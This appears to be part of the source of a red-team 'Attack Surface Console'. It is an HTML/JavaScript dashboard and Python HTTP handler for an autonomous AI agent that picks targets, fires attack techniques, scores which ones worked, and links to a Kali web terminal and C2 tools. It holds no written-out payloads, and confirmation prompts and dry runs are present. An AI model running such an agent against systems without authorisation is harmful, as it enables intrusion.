 fetch('/api/impact',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})
 .then(r=>r.json()).then(j=>{if(j.ok)agentImpactRender(j.impact)}).catch(()=>{});
}

// ---- learning scoreboard ----
// ---- ops console (runtime settings for the live session) ----
function cfgLoad(){
 fetch('/api/agent/config',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})
 .then(r=>r.json()).then(j=>{
  const c=j.config||{};
  $('cfg-brain').checked=c.use_brain!==false;
  $('cfg-brain-v').textContent=c.use_brain===false?'off':'on';
  $('cfg-verify').checked=c.safe_verify!==false;
  $('cfg-verify-v').textContent=c.safe_verify===false?'off':'on';
  $('cfg-campaign').checked=c.campaign===true;
  $('cfg-campaign-v').textContent=c.campaign?'on':'off';
  $('cfg-conf').value=(c.brain_min_confidence!==undefined?c.brain_min_confidence:0.5);
  $('cfg-calls').value=(c.max_brain_calls!==undefined?c.max_brain_calls:5);
  $('cfg-iter').value=(c.max_iterations!==undefined?c.max_iterations:10);
  $('cfg-scope').value=(c.extra_scope||[]).join(', ');
  $('cfg-status').textContent=j.agent_running?'applied to the running session'
   :'stored for the next launch';
 }).catch(()=>{});
}
function cfgApply(){
 const body={
  use_brain:$('cfg-brain').checked,
  safe_verify:$('cfg-verify').checked,
  campaign:$('cfg-campaign').checked,
  brain_min_confidence:parseFloat($('cfg-conf').value),
  max_brain_calls:parseInt($('cfg-calls').value,10),
  max_iterations:parseInt($('cfg-iter').value,10),
  extra_scope:$('cfg-scope').value
 };
 fetch('/api/agent/config',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify(body)})
 .then(r=>r.json()).then(j=>{
  $('cfg-status').textContent=j.ok?('applied: '+Object.keys(j.applied||{}).join(', '))
   :('⚠ '+(j.errors||[]).join('; '));
  cfgLoad(); agentPollOnce();
 }).catch(e=>{$('cfg-status').textContent='⚠ '+e});
}
document.addEventListener('change',e=>{
 if(!e.target)return;
 if(e.target.id==='cfg-brain')$('cfg-brain-v').textContent=e.target.checked?'on':'off';
 if(e.target.id==='cfg-verify')$('cfg-verify-v').textContent=e.target.checked?'on':'off';
 if(e.target.id==='cfg-campaign')$('cfg-campaign-v').textContent=e.target.checked?'on':'off';
});

// ---- continuous ASM: surface deltas between scans ----
function asmLoad(){
 const st=$('asm-status'); if(!st)return;
 fetch('/api/asm/changes',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})
 .then(r=>r.json()).then(j=>{
  const el=$('asm-body'); if(!el)return;
  if(!j.ok){st.textContent='⚠ '+(j.error||'failed');
   el.innerHTML='<span class="muted">ASM database unavailable. It is written on every scan with --asm.</span>';return}
  const rows=j.changes||[];
  st.textContent=rows.length+' unacknowledged';
  if(!rows.length){
   el.innerHTML='<span class="muted">No unacknowledged surface changes. Each scan with --asm records a snapshot; the next delta appears here.</span>';
   return}
  const col=s=>s==='critical'||s==='high'?'var(--crit)':s==='medium'?'var(--warn)':'var(--mut)';
  el.innerHTML=rows.slice(0,40).map(c=>`<div style="display:flex;gap:10px;align-items:center;padding:6px 0;border-top:1px solid var(--bd);font-size:11.5px;flex-wrap:wrap">
    <span style="color:${col(c.severity)};font-weight:700;text-transform:uppercase;font-size:10px;min-width:64px">${esc(c.severity||'info')}</span>
    <b>${esc(c.change_type)}</b>
    <span class="mono">${esc(String(c.field||''))}</span>
    <span class="muted">${esc(String(c.old_value||'—').slice(0,40))} →</span>
    <span class="mono">${esc(String(c.new_value||'—').slice(0,60))}</span>
    <span class="muted" style="font-size:10px">${esc(String(c.detected_at||'').slice(0,19))}</span>
    <button class="btn" data-ack="${c.id}" style="margin-inline-start:auto">✓ ack</button>
  </div>`).join('');
  el.querySelectorAll('button[data-ack]').forEach(b=>{b.onclick=()=>asmAck(b.dataset.ack)});
 }).catch(()=>{st.textContent='⚠ unreachable'});
}
function asmAck(id){
 fetch('/api/asm/ack',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({id:id})})
 .then(r=>r.json()).then(j=>{if(j.ok)asmLoad()}).catch(()=>{});
}

function agentEvidence(){
 fetch('/api/agent/evidence',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})
 .then(r=>r.json()).then(j=>{
  const el=$('agent-evidence'); if(!el)return;
  const rows=j.evidence||[];
  if(!rows.length){el.style.display='none';el.innerHTML='';return}
  el.style.display='';
  const col=o=>o==='confirmed'?'var(--acc)':(o==='not_supported'||o==='error')?'var(--crit)':'var(--mut)';
  el.innerHTML='<div style="font-weight:600;margin-bottom:4px">🗄 Evidence ('+rows.length+')</div>'+
   rows.slice(0,15).map(e=>`<details style="font-size:11px;padding:5px 0;border-top:1px solid var(--bd)">
     <summary><b>${esc(e.technique)}</b> <span class="muted">on ${esc(e.target)}</span>
      · <span style="color:${col(e.outcome)}">${esc(e.outcome)}</span>
      · ${esc(e.source)}${(e.exit_code!==null&&e.exit_code!==undefined)?' · exit '+e.exit_code:''}
      <span class="muted">— show output</span></summary>
     <pre style="white-space:pre-wrap;word-break:break-word;font-size:10px;max-height:200px;overflow:auto;margin:6px 0 0 12px">${esc(e.output||'(nothing captured)')}</pre>
   </details>`).join('');
 }).catch(()=>{});
}

function agentHistory(){
 fetch('/api/agent/runs',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})
 .then(r=>r.json()).then(j=>{
  const el=$('agent-history'); if(!el)return;
  const runs=j.runs||[];
  if(!runs.length){el.style.display='none';el.innerHTML='';return}
  el.style.display='';
  el.innerHTML='<div style="font-weight:600;margin-bottom:4px">🕘 Previous sessions ('+runs.length+')</div>'+
   runs.map(r=>`<div style="font-size:11px;padding:4px 0;border-top:1px solid var(--bd)">
     <b>${esc(r.agent_id)}</b> <span class="muted">${esc(r.ts_end||r.ts_start||'')}</span>
     · ${esc(r.domain||'-')} · ${esc(r.state)} · iter ${r.iteration}/${r.max_iterations}
     · brain ${r.brain_calls} · prepared ${r.prepared} · fired ${r.fired}
     ${(r.moves&&r.moves.length)?'<div class="muted" style="margin-left:10px">moves: '+esc(r.moves.join(' | '))+'</div>':''}
   </div>`).join('');
 }).catch(()=>{});
}
function agentLearn(){
 fetch('/api/agent/learn',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})
 .then(r=>r.json()).then(j=>{
  if(j.ok)renderScoreboard(j.scoreboard||{})}).catch(()=>{});
}
function renderScoreboard(sb){
 const el=$('agent-learn'); if(!el)return;
 if(!sb||!sb.n_records){el.style.display='none';el.innerHTML='';return}
 el.style.display='';
 const pct=(s,d)=>d?Math.round(s*100/d)+'%':'–';
 const src=Object.entries(sb.by_source||{}).map(([k,v])=>
  '<span style="margin-right:12px"><b>'+esc(k)+'</b> '+
  (v.decided?pct(v.success,v.decided)+' <span class="muted">('+v.success+'/'+v.decided+')</span>'
            :'<span class="muted">'+v.pending+' pending</span>')+'</span>').join('');
 const rows=(sb.by_technique||[]).slice(0,12).map(r=>
  '<tr><td>'+esc(r.technique)+'</td><td align="center">'+r.success+'</td><td align="center">'+r.failure+
  '</td><td align="center">'+r.pending+'</td><td align="center">'+r.impact+
  '</td><td align="center">'+(r.decided?pct(r.success,r.decided):'–')+'</td></tr>').join('');
 el.innerHTML='<div style="font-weight:600;margin-bottom:4px">🧠 Learning Scoreboard '+
  '<span class="muted">('+sb.n_records+' records'+(sb.domain?' · '+esc(sb.domain):'')+')</span></div>'+
  '<div style="font-size:11px;margin-bottom:5px">by source: '+src+'</div>'+
  ((sb.worn_out||[]).length?'<div style="font-size:11px;color:var(--crit);margin-bottom:5px">⚠ worn out (never worked): '+sb.worn_out.map(esc).join(', ')+'</div>':'')+
  '<table style="width:100%;font-size:11px;border-collapse:collapse"><thead><tr class="muted">'+
  '<th align="left">technique</th><th>✅</th><th>❌</th><th>pending</th><th>impact</th><th>rate</th>'+
  '</tr></thead><tbody>'+rows+'</tbody></table>';
}

// ---- Chat with Knull (operator <-> reasoning layer) ----
let chatHist=[], chatActions=[];
function chatLog(html){
 const el=$('chat-log'); if(!el)return;
 el.insertAdjacentHTML('beforeend', html);
 el.scrollTop=el.scrollHeight;
}
function chatBubble(role, text, actions){
 const mine=role==='user';
 const col=mine?'var(--acc)':'var(--hi)';
 chatLog(`<div style="margin:8px 0;display:flex;justify-content:${mine?'flex-end':'flex-start'}">
   <div style="max-width:82%;border:1px solid ${mine?'var(--bd2)':'var(--bd)'};border-radius:8px;padding:7px 10px;background:${mine?'#160a06':'var(--panel)'}">
     <div style="font-size:10px;color:var(--muted);margin-bottom:3px">${mine?'🧑 operator':'🧠 Knull'}</div>
     <div style="white-space:pre-wrap;word-break:break-word;line-height:1.5">${esc(text)}</div>
     ${actions&&actions.length?`<div style="margin-top:7px;display:flex;gap:6px;flex-wrap:wrap">${actions.map((a,i)=>
        `<button class="btn" data-caction="${i}">${esc(chatActionLabel(a))}</button>`).join('')}</div>`:''}
   </div></div>`);
 if(actions&&actions.length){
  chatActions=actions;
  $('chat-log').querySelectorAll('button[data-caction]').forEach(b=>{
    b.onclick=()=>chatAction(parseInt(b.dataset.caction,10));
  });
 }
}
function chatActionLabel(a){
 const m={fire:'🎯 Fire',impact_start:'📊 Prove impact',start_scan:'🔍 Scan',
          launch_agent:'🤖 Launch Knull',record:'📝 Record result',
          build_graph:'🕸 Build graph',show_scoreboard:'📈 Scoreboard'};
 let label=m[a.op]||a.op;
 if(a.op==='start_scan'&&a.domain)label+=' — '+a.domain;
 else if(a.op==='launch_agent'&&a.scan_id)label+=' — scan #'+a.scan_id;
 else if(a.op==='show_scoreboard'||a.op==='build_graph')return label;
 else if(a.target_key)label+=' — '+a.target_key;
 return label;
}
function chatAction(i){
 const a=(chatActions||[])[i]; if(!a)return;
 let url='/api/impact/start', body={};
 if(a.op==='fire'){url='/api/agent/fire';body={target_key:a.target_key};}
 else if(a.op==='impact_start'){url='/api/impact/start';body={target_key:a.target_key,max_subs:30};}
 else if(a.op==='start_scan'){url='/api/scan';body={domain:a.domain,max_subs:30};}
 else if(a.op==='launch_agent'){url='/api/agent/start';body={scan_id:a.scan_id,auto_execute:false,max_iterations:10};}
 else if(a.op==='record'){url='/api/agent/record';body={technique:a.technique,target:a.target,outcome:a.outcome,source:'operator'};}
 else if(a.op==='build_graph'){tab('graph',document.getElementById('graphbtn')||$('graphbtn'));graphBuild();return;}
 else if(a.op==='show_scoreboard'){tab('agent',$('agentbtn'));agentLearn();return;}
 else return;
 if(a.op==='fire'&&!confirm('Run this command?\n\n'+a.target_key))return;
 $('chat-status').textContent='⏳ running '+a.op+'…';
 fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})
 .then(r=>r.json()).then(j=>{
  $('chat-status').textContent='';
  if(j.ok===false){chatBubble('knull','⚠ '+(j.error||'rejected'));return;}
  const extra=j.verified!==undefined?'\nverified: '+j.verified:'';
  chatBubble('knull','✅ '+a.op+' done'+extra);
  if(a.op==='start_scan')listenSSE();
  if(a.op==='launch_agent'&&j.agent_id){agentRunning=true;agentPollTimer=setInterval(agentPoll,2000);agentPoll();}
  if(j.status)agentRender(j.status);
  agentLearn(); agentEvidence();
 }).catch(e=>{$('chat-status').textContent='';chatBubble('knull','⚠ '+e);});
}
function chatSend(){
 const inp=$('chat-in'); const msg=(inp.value||'').trim(); if(!msg)return;
 inp.value=''; $('chat-send').disabled=true;
 $('chat-status').textContent='🧠 Knull is thinking…';
 chatBubble('user',msg);
 fetch('/api/knull/chat',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({message:msg,history:chatHist.slice(-12)})})
 .then(r=>r.json()).then(j=>{
  $('chat-send').disabled=false; $('chat-status').textContent='';
  if(!j.ok){chatBubble('knull','⚠ '+(j.error||'failed'));return;}
  chatHist.push({role:'user',content:msg},{role:'assistant',content:j.reply||''});
  chatBubble('knull',(j.reply||'(empty)')+(j.actions&&j.actions.length?'\n\n→ suggested action (click to run):':''),
             j.actions||[]);
 }).catch(e=>{$('chat-send').disabled=false;$('chat-status').textContent='';chatBubble('knull','⚠ '+e);});
}
function chatClear(){chatHist=[];chatActions=[];$('chat-log').innerHTML='';}

// ---- Reports (client-ready, from modules/reporting) ----
function reportGen(){
 const t=($('report-tpl')&&$('report-tpl').value)||'all';
 $('report-status').textContent='⏳ generating…';
 fetch('/api/report/generate',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({template:t})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('report-status').textContent='⚠ '+(j.error||'failed');return}
  const paths=j.paths||{};
  $('report-status').textContent='✅ '+Object.keys(paths).length+' report(s) · '
   +j.findings+' findings · coverage: '+j.coverage;
  $('report-content').style.display='none';
  const out=$('report-out'); out.style.display='';
  out.innerHTML='<div style="font-weight:600;margin-bottom:4px">Generated for '
   +esc(j.target||'target')+'</div>'+
   Object.entries(paths).map(([k,v])=>
    `<div><b>${esc(k)}</b> <span class="muted">${esc(String(v).split('/').pop())}</span> `
    +`<button class="btn" data-rf="${esc(v)}">open</button></div>`).join('');
  out.querySelectorAll('button[data-rf]').forEach(b=>{b.onclick=()=>reportOpen(b.dataset.rf)});
 }).catch(e=>{$('report-status').textContent='⚠ '+e});
}
function reportOpen(path){
 fetch('/api/report/raw',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({file:path})})
 .then(r=>r.text()).then(html=>{
  const v=$('report-view'); v.style.display='';
  v.innerHTML='<div style="padding:9px 14px;border-bottom:1px solid var(--bd)">'
   +`<button class="btn" onclick="document.getElementById('report-view').style.display='none'">✕ close</button>`
   +`<span class="muted" style="margin-inline-start:8px;font-size:11px">${esc(String(path).split('/').pop())}</span></div>`
   +`<iframe style="width:100%;height:72vh;border:0;background:#fff" srcdoc="${esc(html)}"></iframe>`;
 }).catch(()=>{});
}

function supplyAudit(){
 const dir=$('supply-dir').value.trim()||'.';
 fetch('/api/supply/audit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({project_dir:dir})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('supply-results').innerHTML='<div class="muted">⚠ '+(j.error||'failed')+'</div>';return}
  const rs=j.risk_summary||{};const deps=j.dependencies||[];const secs=j.secrets||[];const scripts=j.malicious_scripts||[];
  $('supply-results').innerHTML=
   `<div style="font-weight:600;margin-bottom:6px">📦 Supply Chain Audit</div>`+
   `<div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:8px">
    <span class="sev-badge sv-medium">${deps.length} deps</span>
    <span class="sev-badge ${secs.length?'sv-critical':'sv-low'}">${secs.length} secrets</span>
    <span class="sev-badge ${scripts.length?'sv-critical':'sv-low'}">${scripts.length} malicious scripts</span>
    <span class="sev-badge ${rs.risk_level==='critical'?'sv-critical':rs.risk_level==='high'?'sv-high':'sv-medium'}">Risk: ${rs.overall_risk_score||0}/100 (${rs.risk_level||'?'})</span>
   </div>`+
   (secs.length?`<div style="font-weight:600;margin:6px 0 4px">🔑 Secrets Found (${secs.length})</div>`+
    secs.slice(0,10).map(s=>`<div style="padding:2px 0;font-size:12px"><span class="sev-badge ${s.severity==='critical'?'sv-critical':'sv-high'}">${esc(s.secret_type)}</span> <span class="mono" style="font-size:11px">${esc(s.match)}</span> <span class="muted" style="font-size:10px">${esc(s.file)}:${s.line}</span></div>`).join(''):'')+
   (scripts.length?`<div style="font-weight:600;margin:8px 0 4px">⚠️ Malicious Scripts (${scripts.length})</div>`+
    scripts.map(s=>`<div style="padding:2px 0;font-size:12px"><span class="sev-badge sv-critical">${esc(s.severity)}</span> ${esc(s.description)}</div>`).join(''):'');
 })}
function supplyScanSecret(){
 const code=$('supply-secret').value.trim();
 if(!code){alert('Enter code to scan');return}
 fetch('/api/supply/secrets',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('supply-results').innerHTML='<div class="muted">⚠ '+(j.error||'failed')+'</div>';return}
  const found=j.secrets||[];
  $('supply-results').innerHTML=found.length?('<div style="font-weight:600;margin-bottom:4px">🔍 Secrets Found ('+found.length+')</div>'+
   found.map(s=>`<div style="padding:4px 0;border-bottom:1px solid #1a0a0a"><span class="sev-badge ${s.severity==='critical'?'sv-critical':'sv-high'}">${esc(s.secret_type)}</span> <span class="mono" style="font-size:11px">${esc(s.match)}</span></div>`).join('')):
   '<div class="muted">✅ No secrets found in provided code.</div>';
 })}
function supplyTyposquat(){
 const brand=$('supply-brand').value.trim();
 if(!brand){alert('Enter brand name');return}
 fetch('/api/supply/typosquat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:brand})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('supply-results').innerHTML='<div class="muted">⚠ '+(j.error||'failed')+'</div>';return}
  const variants=j.variants||[];const registered=j.registered||[];
  $('supply-results').innerHTML=
   `<div style="font-weight:600;margin-bottom:4px">🔍 Typosquatting: ${esc(brand)}</div>`+
   `<div class="muted" style="font-size:11px;margin-bottom:6px">${variants.length} variants generated, ${registered.filter(r=>r.registered).length} registered</div>`+
   `<div style="margin-bottom:6px"><b>Registered (risk):</b> ${registered.filter(r=>r.registered).map(r=>`<span class="sev-badge ${r.risk==='high'?'sv-critical':'sv-medium'}" style="margin:2px">${esc(r.domain)}</span>`).join('')||'<span class="muted">none found</span>'}</div>`+
   `<details><summary class="muted" style="cursor:pointer;font-size:11px">All ${variants.length} variants</summary><div style="margin-top:4px">${variants.map(v=>`<span class="mono" style="font-size:10px;margin:2px;display:inline-block;padding:2px 6px;background:#0a0505;border-radius:3px">${esc(v)}</span>`).join('')}</div></details>`;
 })}
function cloudAnalyze(){
 const dom=$('cloud-domain').value.trim();
 if(!dom){alert('Enter target domain');return}
 $('cloud-status').textContent='⏳ analyzing cloud infrastructure…';
 fetch('/api/cloud/analyze',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:dom})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('cloud-status').textContent='⚠ '+(j.error||'failed');return}
  $('cloud-status').textContent=j.summary||'done';
  const assets=j.cloud_assets||[];const buckets=(j.s3_buckets||[]).filter(b=>b.exists);
  const k8s=j.k8s_exposed||[];const paths=j.attack_paths||[];
  $('cloud-results').innerHTML=
   `<div style="font-weight:600;margin-bottom:6px">☁️ Cloud Analysis: ${esc(dom)}</div>`+
   `<div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:8px">
    <span class="sev-badge sv-medium">${assets.length} assets</span>
    <span class="sev-badge ${buckets.length?'sv-critical':'sv-low'}">${buckets.length} S3 buckets</span>
    <span class="sev-badge ${k8s.length?'sv-critical':'sv-low'}">${k8s.length} K8s exposed</span>
    <span class="sev-badge sv-high">${paths.length} attack paths</span>
   </div>`+
   (buckets.length?`<div style="font-weight:600;margin:6px 0 4px">🪣 S3 Buckets</div>`+
    buckets.map(b=>`<div style="padding:2px 0;font-size:12px"><span class="sev-badge sv-critical">${esc(b.access||'?')}</span> <span class="mono">${esc(b.bucket)}</span></div>`).join(''):'')+
   (k8s.length?`<div style="font-weight:600;margin:6px 0 4px">☸️ Kubernetes Exposure</div>`+
    k8s.map(k=>`<div style="padding:2px 0;font-size:12px"><span class="sev-badge sv-critical">${esc(k.type)}</span> <span class="mono">${esc(k.subdomain)}:${k.port}</span></div>`).join(''):'')+
   (paths.length?`<div style="font-weight:600;margin:8px 0 4px">🔗 Attack Paths</div>`+
    paths.map(p=>`<div style="padding:4px 0;border-bottom:1px solid #1a0a0a">
     <div><b>${esc(p.path)}</b> <span class="sev-badge ${p.risk==='critical'?'sv-critical':p.risk==='high'?'sv-high':'sv-medium'}">${esc(p.risk)}</span></div>
     <div class="muted" style="font-size:11px">${esc(p.description)}</div>
     <div class="muted" style="font-size:10px">${esc(p.mitre_id||'')}</div>
    </div>`).join(''):'');
 })}

// ---- Web Terminal (tmux inside kali-as) ----
let termSess=null,termPollTimer=null;
function ansi2html(s){return esc(s)
 .replace(/\x1b\[([0-9;]*)m/g,(m,c)=>{if(!c||c==='0')return '</span>';const map={'1':'<b>','2':'','3':'','4':'<u>','7':'','9':''};
  let out='';for(const p of c.split(';')){if(p==='38;5'||p==='38;2')continue;if(map[p])out+=map[p];
   if(/^3[0-7]$/.test(p)){const cols=['#000','#f00','#0f0','#ff0','#00f','#f0f','#0ff','#fff'];out+=`<span style="color:${cols[+p-30]||'#0f0'}">`}
   if(/^4[0-7]$/.test(p)){const cols=['#000','#800','#080','#880','#008','#808','#088','#888'];out+=`<span style="background:${cols[+p-40]||'#030'}">`}}
  return out+'</span>'})}
function termRender(screen){$('term-screen').innerHTML=ansi2html(screen);$('term-screen').scrollTop=1e9}
function termNew(){
 fetch('/api/term/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cols:120,rows:30})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){alert('🖥 terminal failed: '+(j.error||''));return}
  termSess=j.session;$('term-status').textContent='session: '+termSess;
  $('term-attach').textContent=j.attach_hint||'';
  if(termPollTimer)clearInterval(termPollTimer);
  termPollTimer=setInterval(termPoll,400);termPoll();
  $('term-screen').focus();
 })}
function termPoll(){if(!termSess)return;
 fetch('/api/term/screen?session='+termSess).then(r=>r.json()).then(j=>{
  if(j.ok)termRender(j.screen);
  else if(/no such session|not found/i.test(j.error||'')){clearInterval(termPollTimer);termSess=null;$('term-status').textContent='session ended'}})}
function termKill(){if(!termSess)return;
 fetch('/api/term/kill',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session:termSess})})
 .then(()=>{clearInterval(termPollTimer);termSess=null;$('term-status').textContent='no session';$('term-attach').textContent='';
  $('term-screen').innerHTML='[terminal] session killed. press ▶ New Session.'})}
function termPrefill(){if(!termSess){alert('No terminal session — press ▶ New Session first');return}
 const c=$('term-prefill-cmd').value.trim();if(!c)return;
 fetch('/api/term/prefill',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session:termSess,cmd:c})})
 .then(r=>r.json()).then(j=>{if(!j.ok)alert('pre-fill failed: '+(j.error||''))})}
$('term-screen').addEventListener('click',()=>$('term-hidden-input').focus());
$('term-hidden-input').addEventListener('keydown',e=>{
 e.preventDefault();if(!termSess)return;
 let d=e.key;
 if(d==='Enter')d='\r';else if(d==='Backspace')d='\x7f';else if(d==='Tab')d='\t';
 else if(d==='Control'||d==='Shift'||d==='Alt'||d==='Meta')return;
 else if(e.ctrlKey&&d.length===1)d=String.fromCharCode(d.toUpperCase().charCodeAt(0)-64);
 else if(d.length!==1)return;
 fetch('/api/term/keys',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session:termSess,data:d})})});
function refreshJobs(){
 fetch('/api/actions/pending').then(r=>r.json()).then(j=>{
  const wrap=$('pend-wrap'),pd=$('pend');
  if(j.pending&&j.pending.length){wrap.style.display='';
   pd.innerHTML=j.pending.map(a=>`<div style="margin-bottom:6px" class="mono">${esc(a.tool)} → ${esc(a.target)}<br><span class="muted">${esc(a.cmd)}</span></div>`).join('')}
  else wrap.style.display='none'});
 fetch('/api/actions/jobs').then(r=>r.json()).then(j=>{
  $('tb-j').innerHTML=(j.jobs||[]).map(x=>`<tr><td class="mono"><b>${esc(x.tool)}</b></td><td class="mono muted">${esc(x.target)}</td><td class="mono muted" style="max-width:280px;overflow:hidden;text-overflow:ellipsis">${esc(x.cmd)}</td><td>${x.status==='running'?'<span style="color:var(--warn)">⏳ running</span>':esc(x.status)}</td><td><button class="btn ghost" style="padding:3px 10px" onclick="jobOut('${x.id}')">output</button></td></tr>`).join('')||'<tr><td colspan=5 class="empty">No jobs yet — press ⚔ on a finding.</td></tr>'});
 // badge
 fetch('/api/actions/jobs').then(r=>r.json()).then(j=>{
  const n=(j.jobs||[]).filter(x=>x.status==='running').length;
  $('ac-badge').textContent=`⚔ ${n} jobs`})}
let jobTimer=null;
function pollJobs(){if(jobTimer)clearInterval(jobTimer);refreshJobs();jobTimer=setInterval(refreshJobs,4000)}
function jobOut(id){
 fetch('/api/actions/status?id='+id).then(r=>r.json()).then(j=>{
  if(j.error)return alert('unknown job');
  $('log').innerHTML=(j.output||[]).map(l=>esc(md(l))).join('\n');
  $('log').scrollTop=1e9})}
let es=null;
function listenSSE(){
 if(es)es.close();es=new EventSource('/api/progress');let buf=[];
 es.onmessage=ev=>{try{const m=JSON.parse(ev.data);
  if(m.event==='log'){buf.push(m.line);if(buf.length>16)buf=buf.slice(-16);
   $('log').innerHTML=buf.map(l=>{const e=esc(md(l));
    if(/WARNING|CRITICAL|SPOOF/i.test(l))return '<span class="warn">'+e+'</span>';
    if(/ERROR|FAIL/i.test(l))return '<span class="err">'+e+'</span>';
    if(/\[\+\]|Done|saved|PDF|Hunt/i.test(l))return '<span class="ok">'+e+'</span>';
    return e}).join('\n');
   $('log').scrollTop=1e9}
  if(m.event==='done'){refresh();/* keep the stream open: the agent starts right after */}
    if(m.event==='agent_start'){
     agentLog('◐ Knull started — '+m.domain+' ('+m.agent_id+')')}
    if(m.event==='agent'){agentEvent(m.payload)}
    if(m.event==='impact'){agentImpactRender(m.payload);agentLearn()}
    if(m.event==='agent_error'){agentLog('⚠ agent error: '+m.error)}}
   catch(e){}};
   es.onerror=()=>{es.close()}};
  refresh();setInterval(refresh,5000);

  // ---- Autonomous agent event rendering ----
  function agentEvent(p){
   if(!p)return;
   const st=p.state||'',act=p.action||'',det=p.detail||'';
   const cls=st==='error'?'err':(p.success===false?'warn':'ok');
   agentLog('<span class="'+cls+'">['+esc(st)+'] '+esc(act)+'</span> — '+esc(det));
   if(st==='decide'&&act==='target_selected'){
    agentLog('  <b>next:</b> '+esc(det));}
   if(st==='execute'&&act==='dry_run'){
    agentLog('  <span class="warn">dry run — command prepared, not executed</span>');}}
  function agentLog(html){
   const el=$('agent-events');if(!el)return;
   el.innerHTML+=html+'\n';el.scrollTop=el.scrollHeight;}

// deep-link: /?tab=msf opens a specific tab directly
(function(){
 const q=new URLSearchParams(location.search).get('tab');if(!q)return;
 const btn=document.querySelector('#sidebar .nav-btn[data-t="'+q+'"]');
 if(btn)btn.click();
})();

// ---- BackTrack boot sequence (typewriter on first load) ----
(function(){
 const el=document.getElementById('log');if(!el)return;
 const lines=[
  '[boot] BackTrack Attack Surface Console v0.21.0',
  '[boot] tribute build — the dragon never sleeps',
  '[boot] kernel 6.x-hardened ............ [  OK  ]',
  '[boot] recon modules .................. [  OK  ]',
  '[boot] red-team action center ......... [  OK  ]',
  '[boot] msfrpcd / sliver C2 ............ [  OK  ]',
  '[*] scan output streams here. Press ▶ Run Scan to begin.'
 ];
 let li=0,ci=0,buf='';
 function tick(){
  if(li>=lines.length||window.__asLiveRendered)return; // real scan output wins
  const line=lines[li];
  if(ci<=line.length){
   el.textContent=buf+line.slice(0,ci)+'█';
   ci++;setTimeout(tick,8+Math.random()*18);
  }else{
   buf+=line+'\n';li++;ci=0;
   el.scrollTop=el.scrollHeight;
   setTimeout(tick,60);
  }
 }
 buf='';el.textContent='';tick();
})();
</script></body></html>"""

# ------------------------------------------------------------ HTTP handler

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):  # silence
        pass

    def _json(self, obj, code=200):
        b = json.dumps(obj, ensure_ascii=False, default=str).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        u = urlparse(self.path)
        if u.path == "/":
            b = _HTML.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        elif u.path == "/api/state":
            self._json(_state_payload())
        elif u.path == "/api/diff":
            q = parse_qs(u.query)
            try:
                import db_store
                d = db_store.compare(int(q["a"][0]), int(q["b"][0]), _DB)
                self._json(d)
            except Exception as e:
                self._json({"error": str(e)}, 400)
        elif u.path == "/api/progress":
            self._sse()
        elif u.path == "/api/mitre-heatmap":
            try:
                from modules.redteam.mitre_heatmap import MITREHeatmap
                heat = MITREHeatmap()
                self._json(heat.to_dict())
            except Exception as e:
                self._json({"error": str(e)}, 500)
            return
        elif u.path == "/api/topology":
            try:
                from modules.redteam.network_topology import NetworkTopology
                topo = NetworkTopology()
                self._json(topo.to_dict())
            except Exception as e:
                self._json({"error": str(e)}, 500)
            return
        elif u.path.startswith("/api/risk-trend"):
            qs = parse_qs(u.query)
            domain = qs.get("domain", [None])[0]
            try:
                from modules.redteam.risk_trend import RiskTrend
                rt = RiskTrend(_DB)
                self._json(rt.series(domain))
            except Exception as e:
                self._json({"error": str(e)}, 500)
            return
        elif u.path.startswith("/api/attack-chain"):
            qs = parse_qs(u.query)
            sid = qs.get("scan_id", [None])[0]
            try:
                from modules.redteam.attack_chain import SmartAttackChain
                sac = SmartAttackChain()
                data = None
                if sid:
                    try:
                        data = sac.chain_for_scan(int(sid), _DB)
                    except (TypeError, ValueError):
                        # sid is a domain string → resolve latest scan for it
                        import db_store
                        scan = db_store.latest_scan(sid, _DB)
                        if scan:
                            data = sac.chain_for_scan(scan["id"], _DB)
                if not data:
                    data = sac.default_chain()
                self._json(data)
            except Exception as e:
                self._json({"error": str(e)}, 500)
            return
        elif u.path == "/api/actions/pending":
            from modules import action_center
            self._json({"pending": action_center.list_pending()})
        elif u.path == "/api/actions/jobs":
            from modules import action_center
            self._json({"jobs": action_center.list_jobs()})
        elif u.path == "/api/actions/status":
            from modules import action_center
            q = parse_qs(u.query)
            self._json(action_center.status(q["id"][0]) or {"error": "unknown"})
        elif u.path == "/api/term/screen":
            from modules import web_terminal
            q = parse_qs(u.query)
            self._json(web_terminal.capture(q.get("session", [""])[0]))
        else:
            self.send_error(404)

    def _sse(self):
        import queue
        q = queue.Queue()
